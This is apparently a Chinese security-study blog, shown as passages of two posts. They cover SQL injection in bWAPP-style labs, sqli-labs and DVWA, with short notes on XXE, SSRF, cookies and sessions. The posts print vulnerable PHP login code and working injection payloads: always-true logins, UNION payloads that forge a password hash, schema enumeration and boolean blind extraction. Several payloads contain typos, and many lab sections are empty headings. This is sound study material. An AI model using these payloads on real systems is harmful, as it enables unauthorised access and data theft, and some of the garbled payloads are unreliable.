<h2 id="防护方式-14"><a href="#防护方式-14" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h1><h2 id="产生原因-15"><a href="#产生原因-15" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">    $login = sqli($login);</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">    $password = sqli($password);</span><br><span class="line">    </span><br><span class="line">    $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $row = mysql_fetch_array($recordset);</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">"login"</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在表格中提交数据，且数据未过滤。</p>
<p>如果 login 输入 <code>1&#39; or 1=1 or &#39;1</code>，password 输入任意密码，那么查询语句变为 <code>SELECT * FROM heroes WHERE login = &#39;1&#39; or 1=1 or &#39;1&#39; AND password = &#39;xxxx&#39;</code>，由于 sql 语句的逻辑运算，这个语句恒真，即无论输入什么密码，都能登陆，又叫万能密码</p>
<h2 id="利用方式-15"><a href="#利用方式-15" class="headerlink" title="利用方式"></a>利用方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">1</span><span class="string">' or 1=1 or '</span><span class="number">1</span></span><br><span class="line">password : 随意</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-15"><a href="#防护方式-15" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection (Login Form/User)"></a>SQL Injection (Login Form/User)</h1><h2 id="产生原因-16"><a href="#产生原因-16" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">$login = sqli($login);</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$password = sqli($password);</span><br><span class="line">$password = hash(<span class="string">"sha1"</span>, $password, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">$recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="keyword">if</span>(!$recordset)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$row = mysql_fetch_array($recordset);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">"login"</span>] &amp;&amp; $password == $row[<span class="string">"password"</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		$message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面类似，也是没有过滤输入，这样就可以构造 sql 语句</p>
<p>这里代码逻辑就是先查询 login 再用查询的结果判断有没有和 password 的 sha1 相同的账号</p>
<h2 id="利用方式-16"><a href="#利用方式-16" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">-1</span><span class="string">' union select 1,2,"356a192b7913b04c54574d18c28d46e6395428ab",4,5,6,7,8,9#</span></span><br><span class="line"><span class="string">password : 1</span></span><br></pre></td></tr></table></figure>

<p>查询语句变为 <code>SELECT * FROM users WHERE login = &#39;-1&#39; union select 1,2,&quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;,4,5,6,7,8,9#</code>，这样查询结果就会多一个 union，依靠经验 1 对应 id，2 对应 username，3 对应 password，所以在 3 的位置填入密码的 sha1 值，这样就能构造出来用户为 2，密码为 1 的用户了</p>
<h2 id="防护方式-16"><a href="#防护方式-16" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h1><h2 id="产生原因-17"><a href="#产生原因-17" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-17"><a href="#利用方式-17" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-17"><a href="#防护方式-17" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Drupal"><a href="#SQL-Injection-Drupal" class="headerlink" title="SQL Injection (Drupal)"></a>SQL Injection (Drupal)</h1><h2 id="产生原因-18"><a href="#产生原因-18" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-18"><a href="#利用方式-18" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-18"><a href="#防护方式-18" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h1><h2 id="产生原因-19"><a href="#产生原因-19" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-19"><a href="#利用方式-19" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-19"><a href="#防护方式-19" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h1><h2 id="产生原因-20"><a href="#产生原因-20" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-20"><a href="#利用方式-20" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-20"><a href="#防护方式-20" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h1><h2 id="产生原因-21"><a href="#产生原因-21" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-21"><a href="#利用方式-21" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-21"><a href="#防护方式-21" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h1><h2 id="产生原因-22"><a href="#产生原因-22" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-22"><a href="#利用方式-22" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-22"><a href="#防护方式-22" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h1><h2 id="产生原因-23"><a href="#产生原因-23" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-23"><a href="#利用方式-23" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-23"><a href="#防护方式-23" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h1><h2 id="产生原因-24"><a href="#产生原因-24" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-24"><a href="#利用方式-24" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-24"><a href="#防护方式-24" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h1><h2 id="产生原因-25"><a href="#产生原因-25" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-25"><a href="#利用方式-25" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-25"><a href="#防护方式-25" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Web-Services-SOAP"><a href="#SQL-Injection-Blind-Web-Services-SOAP" class="headerlink" title="SQL Injection - Blind (Web Services/SOAP)"></a>SQL Injection - Blind (Web Services/SOAP)</h1><h2 id="产生原因-26"><a href="#产生原因-26" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-26"><a href="#利用方式-26" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-26"><a href="#防护方式-26" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form)"></a>XML/XPath Injection (Login Form)</h1><h2 id="产生原因-27"><a href="#产生原因-27" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-27"><a href="#利用方式-27" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-27"><a href="#防护方式-27" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Search"><a href="#XML-XPath-Injection-Search" class="headerlink" title="XML/XPath Injection (Search)"></a>XML/XPath Injection (Search)</h1><h2 id="产生原因-28"><a href="#产生原因-28" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-28"><a href="#利用方式-28" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-28"><a href="#防护方式-28" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML 外部实体注入</p>
<p>以 XML 形式发送数据</p>
<p>实现 ssrf</p>
<p>读文件</p>
<p>执行命令</p>
<p>扫描端口</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
<li><p>服务端请求伪造，利用漏洞伪造服务器发送请求，从而获取内网数据</p>
</li>
<li><p>一般情况下，SSRF 的目标就是与外部隔离的内网资源。</p>
</li>
</ul>
<h3 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h3><p>服务端提供了从内网获取数据的功能，但没有对请求目标地址做过滤</p>
<h3 id="SSRF-用途"><a href="#SSRF-用途" class="headerlink" title="SSRF 用途"></a>SSRF 用途</h3><ul>
<li>内外网的端口和服务扫描，获取 Banner 信息</li>
<li>服务器本地敏感数据的读取</li>
<li>内外网主机应用程序漏洞的利用</li>
<li>内外网Web站点漏洞的利用 </li>
<li>……</li>
</ul>
<p>产生 SSRF 的 PHP 函数</p>
<p>file_get_content</p>
<p>fsockopen()</p>
<p>curl_exec()</p>
<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在传统的 Web 应用程序的工作方式下，客户端和浏览器之间的通信时同步的。比如，当用户在 Web 页面上填写好的表单，提交请求后就会发送到远程服务器上，经过处理之后，服务器再将处理的结果返回，这种行为反复执行，极大的浪费了网络带宽。</p>
<p>Ajax是由 JavaScript 与 CSS、XML、DOM 几种老技术加上 XMLHttpRequest 构成。使用 Ajax 技术后，客户端可以只向服务器传输更新过的内容，借助于客户端的 JavaScript 处理来自服务器的响应。比如，当用户在单击表单按钮时，会使用 JavaScript 和 DHTML 立即更新页面，并向服务器发送异步请求，以执行更新或查询数据库。当请求返回时，就可以只使用 JavaScript 和 CSS 来相应的更新页面，因为客户端和服务端只交互有用的数据，页面显示等不必要的数据便不再重新加载。</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul>
<li>搜索引擎能依照用户输入的关键词，自动列出最多人找到的关键词查询</li>
<li>注册模块中，用户填写完用户名后，系统会实时验证该用户名是否被注册</li>
</ul>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Cookie-简介"><a href="#Cookie-简介" class="headerlink" title="Cookie 简介"></a>Cookie 简介</h2><p>Cookie 是一种让网站服务器能把少量文本数据存到客户端硬盘、内存，或者是从客户端的硬盘、内存读取数据的一种技术。</p>
<p>因为 HTTP 协议是无状态的，Web 服务器无法区分一个请求是否来自同一个浏览器。所以，Web 服务器需要额外的数据用于维护会话。Cookie 正式一段随 HTTP 请求、响应一起被传递的额外数据，它的作用就是<strong>标识用户、维持会话</strong>。</p>
<p>当你访问某个网站时，该网站可能向你的电脑写入一个非常小的文本文件，他可以记录你用户的 ID、密码、停留的时间等信息，这个文件就是 Cookie 文件。当你再次访问这个网站时，浏览器会自动检测你的硬盘，并将存储在本地的 Cookie 发送给网站，网站通过读取 Cookie，得到你的相关信息，就可以做出相应的动作。</p>
<p>Cookie 按照在硬盘中存储的位置，可以分为<strong>内存 Cookie</strong> 和 <strong>硬盘 Cookie</strong>。内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的。硬盘 Cookie 保存在硬盘中，有一个过期时间，除非用户手动清理，或者到了过期时间，否则硬盘 Cookie 是不会被删除的，其存在时间是长期的。所以，Cookie 也可以分为<strong>持久 Cookie</strong> 和<strong>非持久 Cookie</strong>。</p>
<p>一个用户电脑里也可以有多个 Cookie 存在，分别保存不同网站的存储信息，但是一个网站只能存取自己的 Cookie 信息，无法读取电脑上的其他 Cookie 信息。</p>
<h2 id="Cookie-格式"><a href="#Cookie-格式" class="headerlink" title="Cookie 格式"></a>Cookie 格式</h2><p>每个 Cookie 文件都是一个 TXT 文件，都以 “<strong>用户名@网站 URL</strong>“ 来命名。</p>
<p>Cookie 部分格式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="tag">&lt;<span class="name">name</span>&gt;</span>=<span class="tag">&lt;<span class="name">value</span>&gt;</span>[;<span class="tag">&lt;<span class="name">Max-Age</span>&gt;</span>=<span class="tag">&lt;<span class="name">age</span>&gt;</span>][;expires=<span class="tag">&lt;<span class="name">date</span>&gt;</span>][;domain=<span class="tag">&lt;<span class="name">domain_name</span>&gt;</span>][;path=<span class="tag">&lt;<span class="name">some_path</span>&gt;</span>][;secure][;HttpOnly]</span><br></pre></td></tr></table></figure>

<ul>
<li>Set-Cookie : HTTP 响应头，Web 服务器通过此 HTTP 头向客户端发送 Cookie</li>
<li>name=value : 每一个 Cookie 必须含有的部分。用户可以根据 name 取出存在 Cookie 中的 value。name=value 中不含有分号、逗号、空格。</li>
<li>expirse=date : Expires 确定了 Cookie 的有效终止日期。该变量是可选的，如果缺省，则 Cookie 的值不会保存在硬盘中，而仅仅保存在内存中。</li>
<li>domain=domain_name : Domain 变量确定了哪些 Internet 域中的服务器可以读取浏览器的存储的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器的域名。</li>
<li>path=path : 定义了 Web 服务器上哪些路径下的页面可以获取服务器发送的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器传给浏览器的资源路径名。</li>
<li>secure : 如果在 Cookie 中标记该变量，表明和服务器之间的通信协议为加密认证协议时，才会发送 Cookie，目前只有 HTTPS。</li>
<li>HttpOnly : 禁止 Javascript 读取 Cookie。</li>
</ul>
<h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><p>除了 Cookie 之外，SESSION 是另外一种维持会话访问状态的机制。只不过 SESSION 是服务端的机制，SESSION 与 Cookie 的区别就是，SESSION 保存在服务端，Cookie 保存在客户端。</p>
<p>Web 中的 SESSION 是指从打开一个网站到关闭浏览器的过程，也就是客户端与服务端一次”对话”，被称为 SESSION，当浏览器关闭时，SESSION 也自动注销。</p>
<p>每个用户的会话状态都是不同的 SESSION，管理员登陆网站时，这是一个 SESSION，普通用户登陆网站时，这又是一个 SESSION。而服务器依靠 SESSIONID 来区分不同的 SESSION。</p>
<p>当用户第一次连接到服务器时，会分配一个 SESSIONID，这个 SESSIONID 是唯一的，且不会重复，当服务器或浏览器关闭时，SESSION 将自动注销，用户重新连接时会重新分配。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/10/SQL注入总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/10/SQL注入总结/" itemprop="url">SQL 注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-10T09:58:16+08:00">
                2019-06-10
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="sqli-labs和dvwa"><a href="#sqli-labs和dvwa" class="headerlink" title="sqli-labs和dvwa"></a>sqli-labs和dvwa</h2><p>在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1</p>
<p>由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况</p>
<p>同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26</p>
<p>在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。</p>
<h2 id="一些闭合方式"><a href="#一些闭合方式" class="headerlink" title="一些闭合方式"></a>一些闭合方式</h2><p>‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’}</p>
<h1 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h1><h2 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h2><p>字符型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos;1&apos;&apos; LIMIT 0,1 </span><br><span class="line">//有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; </span><br><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1&apos;%23	 //返回正常</span><br></pre></td></tr></table></figure>

<p>数字型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos; LIMIT 0,1 </span><br><span class="line">//有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id </span><br><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1+1	 //返回正常</span><br></pre></td></tr></table></figure>

<h2 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union slect 1,2,3 %23  </span><br><span class="line">?id=1&apos; order by 3 %23  </span><br><span class="line">//返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当前数据库 </span><br><span class="line">?id=1&apos; uinon select databse(),2,3 %23 </span><br><span class="line">//所有数据库 </span><br><span class="line">?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据列"><a href="#数据列" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据内容"><a href="#数据内容" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select xxx from xxx,3 %23</span><br></pre></td></tr></table></figure>

<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。</p>
<p>盲注分为布尔型，时间型和报错型。</p>
<p>首先判断注入类型，和以前相同，要注意二分法的应用。</p>
<h2 id="数据库名称长度"><a href="#数据库名称长度" class="headerlink" title="数据库名称长度"></a>数据库名称长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//用二分法判断范围 </span><br><span class="line">?id=1&apos; and length(database())=8 %23  //返回正确，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>

<h2 id="数据库名称内容"><a href="#数据库名称内容" class="headerlink" title="数据库名称内容"></a>数据库名称内容</h2><p><strong>left判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<p><strong>substr判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<p><strong>regexp判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23</span><br></pre></td></tr></table></figure>

<p><strong>mid判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<h2 id="数据表-1"><a href="#数据表-1" class="headerlink" title="数据表"></a>数据表</h2><p>先用length()判断长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23</span><br></pre></td></tr></table></figure>

<p>然后判断内容</p>
